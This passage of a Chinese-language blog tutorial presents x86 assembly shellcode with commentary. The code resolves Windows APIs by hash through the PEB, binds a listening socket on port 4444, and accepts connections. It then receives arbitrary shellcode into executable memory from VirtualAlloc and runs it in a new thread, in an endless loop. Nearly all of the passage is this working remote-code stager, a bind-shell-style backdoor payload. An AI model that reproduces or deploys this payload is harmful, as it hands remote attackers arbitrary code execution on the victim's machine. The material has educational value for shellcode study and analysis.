    <span  style="color: #00007f; font-weight: normal;">cmp</span>     <span  style="color: #46aa03; font-weight: normal;">edi</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">ebp</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">24h</span><span  style="color: #009900; font-weight: bold;">]</span>  <span  style="color: #666666; font-style: normal;">; 判断HASH值是否和传入的参数一致</span>
    <span  style="color: #00007f; font-weight: normal;">jnz</span>     short loc_4A    <span  style="color: #666666; font-style: normal;">; 不相等继续寻找</span>
    <span  style="color: #00007f; font-weight: normal;">pop</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">ebx</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">24h</span><span  style="color: #009900; font-weight: bold;">]</span>
    <span  style="color: #00007f; font-weight: normal;">add</span>     <span  style="color: #46aa03; font-weight: normal;">ebx</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">edx</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">cx</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">ebx</span><span  style="color: #339933;">+</span><span  style="color: #46aa03; font-weight: normal;">ecx</span><span  style="color: #339933;">*</span><span  style="color: #ff0000;">2</span><span  style="color: #009900; font-weight: bold;">]</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">ebx</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">1Ch</span><span  style="color: #009900; font-weight: bold;">]</span>
    <span  style="color: #00007f; font-weight: normal;">add</span>     <span  style="color: #46aa03; font-weight: normal;">ebx</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">edx</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">ebx</span><span  style="color: #339933;">+</span><span  style="color: #46aa03; font-weight: normal;">ecx</span><span  style="color: #339933;">*</span><span  style="color: #ff0000;">4</span><span  style="color: #009900; font-weight: bold;">]</span>
    <span  style="color: #00007f; font-weight: normal;">add</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">edx</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">esp</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">28h</span><span  style="color: #339933;">-</span><span  style="color: #ff0000;">4</span><span  style="color: #009900; font-weight: bold;">]</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">eax</span> <span  style="color: #666666; font-style: normal;">; 保存函数的地址</span>
    <span  style="color: #00007f; font-weight: normal;">pop</span>     <span  style="color: #46aa03; font-weight: normal;">ebx</span>
    <span  style="color: #00007f; font-weight: normal;">pop</span>     <span  style="color: #46aa03; font-weight: normal;">ebx</span>
    <span  style="color: #00007f; font-weight: normal;">popa</span>                    <span  style="color: #666666; font-style: normal;">; 对应pusha</span>
    <span  style="color: #00007f; font-weight: normal;">pop</span>     <span  style="color: #46aa03; font-weight: normal;">ecx</span>             <span  style="color: #666666; font-style: normal;">; 弹出上一个函数返回地址到ECX</span>
    <span  style="color: #00007f; font-weight: normal;">pop</span>     <span  style="color: #46aa03; font-weight: normal;">edx</span>             <span  style="color: #666666; font-style: normal;">; 弹出函数名HASH值参数</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">ecx</span>             <span  style="color: #666666; font-style: normal;">; 压入上一个函数的返回地址</span>
    <span  style="color: #00007f; font-weight: normal;">jmp</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span>             <span  style="color: #666666; font-style: normal;">; 调用函数(刚好对应上一个函数传入的第参数)</span>
&nbsp;
loc_88<span  style="color: #339933;">:</span>
    <span  style="color: #00007f; font-weight: normal;">pop</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span>
&nbsp;
loc_89<span  style="color: #339933;">:</span>
    <span  style="color: #00007f; font-weight: normal;">pop</span>     <span  style="color: #46aa03; font-weight: normal;">edi</span>
    <span  style="color: #00007f; font-weight: normal;">pop</span>     <span  style="color: #46aa03; font-weight: normal;">edx</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">edx</span><span  style="color: #339933;">,</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">edx</span><span  style="color: #009900; font-weight: bold;">]</span>
    <span  style="color: #00007f; font-weight: normal;">jmp</span>     short loc_15    <span  style="color: #666666; font-style: normal;">; 继续下一个DLL查找</span>
<span  style="color: #666666; font-style: normal;">;fnFunctionCaller endp</span>
<span  style="color: #666666; font-style: normal;">;=========================================================</span>
    end <span  style="color: #0000ff; font-weight: normal;">start</span></pre></td></tr></tbody></table></div>

<p>一开始就是一条cld指令和一个call，先看一下call里面的部分代码：</p>

<div  class="wp_syntax"><table><tbody><tr><td  class="code"><pre  class="asm"  style="font-family:monospace;"><span  style="color: #666666; font-style: normal;">;=========================================================</span>
<span  style="color: #666666; font-style: normal;">;kMainFun函数</span>
<span  style="color: #666666; font-style: normal;">;=========================================================</span>
kMainFun proc
    <span  style="color: #00007f; font-weight: normal;">pop</span>     <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; EBP = fnFunctionCaller</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #7f007f;">'23'</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #7f007f;">'_2sw'</span>      <span  style="color: #666666; font-style: normal;">; ws2_32</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">esp</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">726774Ch</span>    <span  style="color: #666666; font-style: normal;">; LoadLibrary的HASH值</span>
    <span  style="color: #00007f; font-weight: normal;">call</span>    <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; 调用LoadLibrary加载ws2_32.dll</span>
    <span  style="color: #666666; font-style: normal;">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span></pre></td></tr></tbody></table></div>

<p>看到call/pop是不是很熟悉的感觉？其实就是把fnFunctionCaller的地址弹给ebp，然后在压入函数参数和一个HASH值，接着call ebp。这里的fnFunctionCaller就像是一个Wrapper，fnFunctionCaller里面的代码逻辑为：通过PEB的InMemoryOrderModuleList链表遍历每一个DLL，根据DLL的名字（如Kernel32.dll）计算出一个HASH值A，然后遍历每个DLL的导出表，计算每个通过名字导出的函数的名字计算出另一个HASH值B，通过A+B=C计算出哈希值的和C，然后通过传入的hash参数进行对比，相等就获取这个函数的地址。接着通过合适的处理栈，使得之前传过来的参数刚刚设置为这个函数的额参数结构，返回地址则返回到call ebp的下一条指令所在的位置，然后就调用了函数了。<br>
</p><div  id="attachment_2844"  class="wp-caption aligncenter"  style="width: 632px"><a  href="http://www.programlife.net/wp-content/uploads/2013/10/ShellCode-Framework-Analysis.jpg"><img  src="./监听端口并且执行客户端发生的shellcode的shellcode_ 程序人生_files/ShellCode-Framework-Analysis.jpg"  alt="ShellCode Framework Analysis"  width="622"  height="417"  class="size-full wp-image-2844"></a><p  class="wp-caption-text">ShellCode Framework Analysis</p></div><p></p>
<p>ShellCode主要的代码逻辑就位于kMainFun函数里面，我们保留其中有用的部分，把accept之后的代码删掉，现在需要添加自己的逻辑了：使用VirtualAlloc分配足够大小的带可执行属性的空间、接收来自控制端的<a  href="http://www.programlife.net/tag/shellcode"  title="ShellCode"  target="_blank">ShellCode</a>、判断接收是否正确、创建新线程执行ShellCode、等待线程执行完毕。这样不断的循环即可。</p>
<p>这里本来是先调用HeapAlloc，然后调用VirtualProtect来修改属性的，只是后来发现HeapAlloc被重定向到了RtlAllocateHeap，然后也就不知道为何就异常了，不过后来发现VirtualAlloc更加简单。</p>

<div  class="wp_syntax"><table><tbody><tr><td  class="code"><pre  class="asm"  style="font-family:monospace;"><span  style="color: #666666; font-style: normal;">;=========================================================</span>
<span  style="color: #666666; font-style: normal;">;kMainFun函数</span>
<span  style="color: #666666; font-style: normal;">;=========================================================</span>
kMainFun proc
    <span  style="color: #00007f; font-weight: normal;">pop</span>     <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; EBP = fnFunctionCaller</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #7f007f;">'23'</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #7f007f;">'_2sw'</span>      <span  style="color: #666666; font-style: normal;">; ws2_32</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">esp</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">726774Ch</span>    <span  style="color: #666666; font-style: normal;">; LoadLibrary的HASH值</span>
    <span  style="color: #00007f; font-weight: normal;">call</span>    <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; 调用LoadLibrary加载ws2_32.dll</span>
    <span  style="color: #666666; font-style: normal;">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">,</span> <span  style="color: #ff0000;">190h</span>
    <span  style="color: #00007f; font-weight: normal;">sub</span>     <span  style="color: #46aa03; font-weight: normal;">esp</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">eax</span>    <span  style="color: #666666; font-style: normal;">; 分配栈空间</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">esp</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">6B8029h</span>
    <span  style="color: #00007f; font-weight: normal;">call</span>    <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; 调用WSAStartup 进行socket初始化</span>
    <span  style="color: #666666; font-style: normal;">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">inc</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">inc</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0E0DF0FEAh</span>
    <span  style="color: #00007f; font-weight: normal;">call</span>    <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; 调用WSASocketA创建一个socket</span>
    <span  style="color: #666666; font-style: normal;">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">edi</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">eax</span>
    <span  style="color: #00007f; font-weight: normal;">xor</span>     <span  style="color: #46aa03; font-weight: normal;">ebx</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">ebx</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">ebx</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">5C110002h</span>   <span  style="color: #666666; font-style: normal;">; 0002-AF_INET  5C11-4444端口</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">esi</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">esp</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">10h</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">esi</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">edi</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">6737DBC2h</span>
    <span  style="color: #00007f; font-weight: normal;">call</span>    <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; 调用bind函数在4444端口进行绑定</span>
    <span  style="color: #666666; font-style: normal;">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span>
    <span  style="color: #666666; font-style: normal;">; 分配栈空间保留相关变量</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #46aa03; font-weight: normal;">ecx</span><span  style="color: #339933;">,</span> <span  style="color: #ff0000;">100h</span>
loc_alloc_stack_mem<span  style="color: #339933;">:</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0h</span>
    <span  style="color: #00007f; font-weight: normal;">loop</span>    loc_alloc_stack_mem
    <span  style="color: #666666; font-style: normal;">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">ebx</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">edi</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0FF38E9B7h</span>
    <span  style="color: #00007f; font-weight: normal;">call</span>    <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; 调用listen开始监听</span>
    <span  style="color: #666666; font-style: normal;">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span>
loc_wait_connect<span  style="color: #339933;">:</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">ebx</span>         <span  style="color: #666666; font-style: normal;">; 保存ebx</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">edi</span>         <span  style="color: #666666; font-style: normal;">; 保存edi</span>
&nbsp;
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">ebx</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">ebx</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #46aa03; font-weight: normal;">edi</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0E13BEC74h</span>
    <span  style="color: #00007f; font-weight: normal;">call</span>    <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; 调用accept等待客户端的连接请求</span>
    <span  style="color: #666666; font-style: normal;">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span> <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">esp</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">50h</span><span  style="color: #009900; font-weight: bold;">]</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">eax</span>  <span  style="color: #666666; font-style: normal;">; [变量]保存客户端socket</span>
&nbsp;
loc_wait_shellcode<span  style="color: #339933;">:</span>
    <span  style="color: #666666; font-style: normal;">; 分配堆空间</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">40h</span>         <span  style="color: #666666; font-style: normal;">; PAGE_EXECUTE_READWRITE</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">1000h</span>       <span  style="color: #666666; font-style: normal;">; MEM_COMMIT</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">19000h</span>      <span  style="color: #666666; font-style: normal;">; 100KB</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0h</span>          <span  style="color: #666666; font-style: normal;">; lpAddress</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0E553A458h</span>
    <span  style="color: #00007f; font-weight: normal;">call</span>    <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; VirtualAlloc</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">esp</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">54h</span><span  style="color: #009900; font-weight: bold;">]</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">eax</span>  <span  style="color: #666666; font-style: normal;">; [变量]保存hMem</span>
    <span  style="color: #666666; font-style: normal;">; 接收ShellCode内容</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0</span>           <span  style="color: #666666; font-style: normal;">; flags</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">18FFFh</span>      <span  style="color: #666666; font-style: normal;">; len</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">esp</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">54h</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">8h</span><span  style="color: #009900; font-weight: bold;">]</span><span  style="color: #666666; font-style: normal;">; buf</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">esp</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">50h</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">0Ch</span><span  style="color: #009900; font-weight: bold;">]</span><span  style="color: #666666; font-style: normal;">; socket</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">5FC8D902h</span>
    <span  style="color: #00007f; font-weight: normal;">call</span>    <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; recv 接收shellcode内容</span>
    <span  style="color: #666666; font-style: normal;">; 判断是否出错</span>
    <span  style="color: #00007f; font-weight: normal;">cmp</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">,</span> <span  style="color: #ff0000;">0FFFFFFFFh</span> <span  style="color: #666666; font-style: normal;">; 返回-1表示出错了</span>
    <span  style="color: #00007f; font-weight: normal;">jz</span>      loc_over
    <span  style="color: #00007f; font-weight: normal;">cmp</span>     <span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #339933;">,</span> <span  style="color: #ff0000;">0h</span>
    <span  style="color: #00007f; font-weight: normal;">jnz</span>     loc_run_shellcode   <span  style="color: #666666; font-style: normal;">; 接收到了数据</span>
    <span  style="color: #666666; font-style: normal;">; 没有接收到任何数据，视为出错了</span>
    <span  style="color: #666666; font-style: normal;">; 先回收空间</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">4000h</span>       <span  style="color: #666666; font-style: normal;">; MEM_DECOMMIT</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">19000h</span>      <span  style="color: #666666; font-style: normal;">; 100KB</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">esp</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">54h</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">8h</span><span  style="color: #009900; font-weight: bold;">]</span><span  style="color: #666666; font-style: normal;">; buf</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">300F2F0Bh</span>
    <span  style="color: #00007f; font-weight: normal;">call</span>    <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; 调用VirtualFree</span>
    <span  style="color: #00007f; font-weight: normal;">jmp</span>      loc_over
    <span  style="color: #666666; font-style: normal;">; 创建新线程</span>
loc_run_shellcode<span  style="color: #339933;">:</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0h</span>          <span  style="color: #666666; font-style: normal;">; lpThreadId = NULL</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0h</span>          <span  style="color: #666666; font-style: normal;">; dwCreationFlags = 立即执行</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0h</span>          <span  style="color: #666666; font-style: normal;">; lpParameter = NULL</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">esp</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">54h</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">0Ch</span><span  style="color: #009900; font-weight: bold;">]</span><span  style="color: #666666; font-style: normal;">; lpStartAddress = buffer</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0h</span>          <span  style="color: #666666; font-style: normal;">; dwStackSize = 0</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0h</span>          <span  style="color: #666666; font-style: normal;">; lpThreadAttributes = NULL</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0160D6838h</span>   
    <span  style="color: #00007f; font-weight: normal;">call</span>    <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; 调用CreateThread执行ShellCode</span>
    <span  style="color: #00007f; font-weight: normal;">mov</span>     <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">esp</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">58h</span><span  style="color: #009900; font-weight: bold;">]</span><span  style="color: #339933;">,</span> <span  style="color: #46aa03; font-weight: normal;">eax</span><span  style="color: #666666; font-style: normal;">; [变量]保存hThread</span>
    <span  style="color: #666666; font-style: normal;">; 等待线程结束</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0FFFFFFFFh</span>  <span  style="color: #666666; font-style: normal;">; INFINITE</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">esp</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">58h</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">4h</span><span  style="color: #009900; font-weight: bold;">]</span><span  style="color: #666666; font-style: normal;">; hThread</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">601D8708h</span>   
    <span  style="color: #00007f; font-weight: normal;">call</span>    <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; WaitForSingleObject</span>
    <span  style="color: #666666; font-style: normal;">; 回收空间</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">4000h</span>       <span  style="color: #666666; font-style: normal;">; MEM_DECOMMIT</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">19000h</span>      <span  style="color: #666666; font-style: normal;">; 100KB</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #009900; font-weight: bold;">[</span><span  style="color: #46aa03; font-weight: normal;">esp</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">54h</span><span  style="color: #339933;">+</span><span  style="color: #ff0000;">8h</span><span  style="color: #009900; font-weight: bold;">]</span><span  style="color: #666666; font-style: normal;">; buf</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">300F2F0Bh</span>
    <span  style="color: #00007f; font-weight: normal;">call</span>    <span  style="color: #46aa03; font-weight: normal;">ebp</span>         <span  style="color: #666666; font-style: normal;">; 调用VirtualFree</span>
    <span  style="color: #666666; font-style: normal;">; 等待下一个发送内容</span>
    <span  style="color: #00007f; font-weight: normal;">jmp</span>     loc_wait_shellcode  <span  style="color: #666666; font-style: normal;">; 等待下一段ShellCode</span>
&nbsp;
loc_over<span  style="color: #339933;">:</span>               <span  style="color: #666666; font-style: normal;">; 准备下一轮连接</span>
    <span  style="color: #00007f; font-weight: normal;">pop</span>     <span  style="color: #46aa03; font-weight: normal;">edi</span>         <span  style="color: #666666; font-style: normal;">; 恢复edi</span>
    <span  style="color: #00007f; font-weight: normal;">pop</span>     <span  style="color: #46aa03; font-weight: normal;">ebx</span>         <span  style="color: #666666; font-style: normal;">; 恢复ebx</span>
    <span  style="color: #00007f; font-weight: normal;">jmp</span>     loc_wait_connect    <span  style="color: #666666; font-style: normal;">; 等待下一个连接</span>
&nbsp;
    <span  style="color: #666666; font-style: normal;">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span>
    <span  style="color: #00007f; font-weight: normal;">push</span>    <span  style="color: #ff0000;">0</span>
